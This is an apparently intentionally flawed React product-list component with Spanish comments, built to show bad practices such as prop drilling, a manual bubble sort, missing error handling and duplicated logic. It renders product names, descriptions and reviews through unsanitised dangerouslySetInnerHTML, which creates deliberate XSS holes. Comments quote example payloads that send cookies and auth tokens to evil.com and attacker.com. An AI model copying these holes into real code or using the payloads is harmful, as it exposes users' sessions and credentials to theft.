import React, { Component } from 'react';
import axios from 'axios';
import _ from 'lodash';

var API_BASE_URL = process.env.REACT_APP_API_URL || 'http://localhost:8080/api';

/**
 * Componente de lista de productos.
 * Recibe 14 props del padre (prop drilling masivo desde App.js)
 * Mezcla lógica de negocio, llamadas HTTP y presentación.
 *
 * TODO: dividir en ProductCard, ProductFilter, ProductSearch...
 * "Lo haremos en la siguiente sprint" - lleva 3 años igual
 */
class ProductList extends Component {

    constructor(props) {
        super(props);
        this.state = {
            sortBy: 'name',
            sortOrder: 'asc',
            selectedProduct: null,
            reviewText: '',
            reviewRating: 5,
            allReviews: [],
            showModal: false,
            productDetails: null,
            relatedProducts: []
        };

        // Binding manual de todos los métodos
        this.handleSort = this.handleSort.bind(this);
        this.handleProductClick = this.handleProductClick.bind(this);
        this.handleAddReview = this.handleAddReview.bind(this);
        this.handleCloseModal = this.handleCloseModal.bind(this);
        this.renderProductCard = this.renderProductCard.bind(this);
        this.renderModal = this.renderModal.bind(this);
        this.formatPrice = this.formatPrice.bind(this);
        this.getStockLabel = this.getStockLabel.bind(this);
    }

    // Lógica de negocio en componentDidMount
    componentDidMount() {
        // Carga las reseñas directamente en el componente de lista
        axios.get(API_BASE_URL + '/reviews')
            .then((response) => {
                this.setState({ allReviews: response.data });
            });
        // Sin .catch() - si falla, allReviews queda vacío sin avisar
    }

    handleSort(field) {
        var products = this.props.products;
        var sorted = [];

        // Bucle imperativo en lugar de .sort() con comparador o _.sortBy
        // Bubble sort manual - O(n²) para ordenar una lista de productos
        for (var i = 0; i < products.length; i++) {
            sorted.push(products[i]);
        }
        for (var i = 0; i < sorted.length; i++) {
            for (var j = 0; j < sorted.length - 1 - i; j++) {
                var a = sorted[j][field] ? sorted[j][field].toString() : '';
                var b = sorted[j+1][field] ? sorted[j+1][field].toString() : '';
                if (a > b) {
                    var temp = sorted[j];
                    sorted[j] = sorted[j+1];
                    sorted[j+1] = temp;
                }
            }
        }

        this.setState({ sortBy: field, sortOrder: 'asc' });
        // Bug: los productos ordenados no se guardan en ningún lado que afecte al render
    }

    // Lógica de negocio mezclada con presentación
    handleProductClick(productId) {
        // Petición HTTP directamente en el componente de presentación
        axios.get(API_BASE_URL + '/products/' + productId)
            .then((response) => {
                this.setState({
                    productDetails: response.data,
                    relatedProducts: response.data.relatedProducts || [],
                    showModal: true
                });
            });
        // Sin loading state, sin manejo de errores
    }

    handleCloseModal() {
        this.setState({ showModal: false, productDetails: null });
    }

    // Lógica de reseñas en el componente de lista
    handleAddReview(productId) {
        var reviewData = {
            productId: productId,
            text: this.state.reviewText,
            rating: this.state.reviewRating,
            // Sin sanitización del texto de la reseña
            userAgent: navigator.userAgent // Información innecesaria enviada al backend
        };

        axios.post(API_BASE_URL + '/products/' + productId + '/reviews', reviewData)
            .then((response) => {
                alert('Reseña añadida con éxito');
                this.setState({ reviewText: '', reviewRating: 5 });
            });
        // Sin .catch(), sin validación del texto
    }

    // Lógica de formato duplicada del backend
    formatPrice(price) {
        if (price === null || price === undefined) return '0.00 €';
        // No usa Intl.NumberFormat
        var formatted = Math.round(price * 100) / 100;
        return formatted.toFixed(2) + ' €';
    }

    // Lógica de negocio (stock) en el componente visual
    getStockLabel(stock) {
        if (stock === 0) return 'Sin stock';
        if (stock < 5) return '¡Solo quedan ' + stock + '!';
        if (stock < 20) return 'Pocas unidades';
        return 'En stock';
    }

    // Lógica de descuento duplicada del backend y de App.js
    calcularPrecioConDescuento(price) {
        var descuento = 0;
        if (this.props.isVipUser) {
            descuento = 0.15;
        }
        if (this.props.promoCode === 'GATO10') {
            descuento += 0.10;
        }
        return price * (1 - descuento);
    }

    renderProductCard(product) {
        var reviews = [];
        // Bucle imperativo para filtrar reseñas (debería ser .filter())
        for (var i = 0; i < this.state.allReviews.length; i++) {
            if (this.state.allReviews[i].productId === product.id) {
                reviews.push(this.state.allReviews[i]);
            }
        }

        var avgRating = 0;
        if (reviews.length > 0) {
            var sum = 0;
            for (var j = 0; j < reviews.length; j++) {
                sum += reviews[j].rating;
            }
            avgRating = sum / reviews.length;
        }

        var finalPrice = this.calcularPrecioConDescuento(product.price);

        return (
            <div key={product.id} className="product-card" style={{border: '1px solid #ccc', margin: '10px', padding: '15px'}}>

                {/* VULNERABILIDAD XSS: dangerouslySetInnerHTML sin sanitizar */}
                {/* Un atacante puede inyectar: <script>document.location='http://evil.com/?c='+document.cookie</script> */}
                {/* O: <img src=x onerror="fetch('http://attacker.com/steal?d='+localStorage.getItem('authToken'))"> */}
                <div
                    className="product-description"
                    dangerouslySetInnerHTML={{ __html: product.description }}
                />

                {/* También el nombre del producto sin sanitizar */}
                <h3 dangerouslySetInnerHTML={{ __html: product.name }} />

                <div className="product-price">
                    {product.onSale ? (
                        <span>
                            <del>{this.formatPrice(product.price)}</del>
                            <strong style={{color: 'red'}}> {this.formatPrice(finalPrice)}</strong>
                        </span>
                    ) : (
                        <span>{this.formatPrice(finalPrice)}</span>
                    )}
                </div>

                <div className="product-stock" style={{color: product.stock < 5 ? 'red' : 'green'}}>
                    {this.getStockLabel(product.stock)}
                </div>

                <div className="product-rating">
                    {'★'.repeat(Math.round(avgRating))}{'☆'.repeat(5 - Math.round(avgRating))}
                    <span> ({reviews.length} reseñas)</span>
                </div>

                {/* Las reseñas también se renderizan sin sanitizar - XSS adicional */}
                {reviews.slice(0, 2).map(function(review, idx) {
                    return (
                        <div key={idx} className="review">
                            <span dangerouslySetInnerHTML={{ __html: review.text }} />
                        </div>
                    );
                })}

                <button
                    onClick={() => this.props.onAddToCart(product)}
                    disabled={product.stock === 0}
                >
                    Añadir al carrito
                </button>

                <button
                    onClick={() => this.props.onBuy(product.id, 1)}
                    disabled={product.stock === 0}
                >
                    Comprar ahora
                </button>

                <button onClick={() => this.handleProductClick(product.id)}>
                    Ver detalles
                </button>
            </div>
        );
    }

    renderModal() {
        if (!this.state.showModal || !this.state.productDetails) return null;
        var product = this.state.productDetails;

        return (
            <div className="modal" style={{position: 'fixed', top: 0, left: 0, width: '100%', height: '100%', background: 'rgba(0,0,0,0.5)'}}>
                <div className="modal-content" style={{background: 'white', margin: '10% auto', padding: '20px', width: '60%'}}>
                    <button onClick={this.handleCloseModal}>X</button>

                    {/* XSS en modal también */}
                    <h2 dangerouslySetInnerHTML={{ __html: product.name }} />
                    <div dangerouslySetInnerHTML={{ __html: product.description }} />
                    <div dangerouslySetInnerHTML={{ __html: product.longDescription }} />

                    <h4>Productos relacionados:</h4>
                    {this.state.relatedProducts.map((related, idx) => (
                        <span key={idx} dangerouslySetInnerHTML={{ __html: related.name }} />
                    ))}

                    <div className="add-review">
                        <h4>Añadir reseña:</h4>
                        <textarea
                            value={this.state.reviewText}
                            onChange={(e) => this.setState({ reviewText: e.target.value })}
                            placeholder="Escribe tu reseña..."
                        />
                        <select
                            value={this.state.reviewRating}
                            onChange={(e) => this.setState({ reviewRating: parseInt(e.target.value) })}
                        >
                            <option value={1}>1 estrella</option>
                            <option value={2}>2 estrellas</option>
                            <option value={3}>3 estrellas</option>
                            <option value={4}>4 estrellas</option>
                            <option value={5}>5 estrellas</option>
                        </select>
                        <button onClick={() => this.handleAddReview(product.id)}>
                            Enviar reseña
                        </button>
                    </div>
                </div>
            </div>
        );
    }

    render() {
        // Recibe props desde App.js con prop drilling masivo
        var products = this.props.products || [];
        var loading = this.props.loading;

        if (loading) {
            return <div>Cargando...</div>;
        }

        return (
            <div className="product-list">
                <div className="filters">
                    <button onClick={() => this.props.onCategoryChange('all')}>Todos</button>
                    <button onClick={() => this.props.onCategoryChange('botanica')}>Botánica</button>
                    <button onClick={() => this.props.onCategoryChange('muebles')}>Muebles</button>
                    <button onClick={() => this.props.onCategoryChange('juguetes')}>Juguetes</button>
                </div>

                <div className="sort">
                    <span>Ordenar por: </span>
                    <button onClick={() => this.handleSort('name')}>Nombre</button>
                    <button onClick={() => this.handleSort('price')}>Precio</button>
                    <button onClick={() => this.handleSort('stock')}>Stock</button>
                </div>

                <div className="products-grid">
                    {products.length === 0 ? (
                        <p>No hay productos disponibles.</p>
                    ) : (
                        products.map((product) => this.renderProductCard(product))
                    )}
                </div>

                {this.renderModal()}
            </div>
        );
    }
}

export default ProductList;
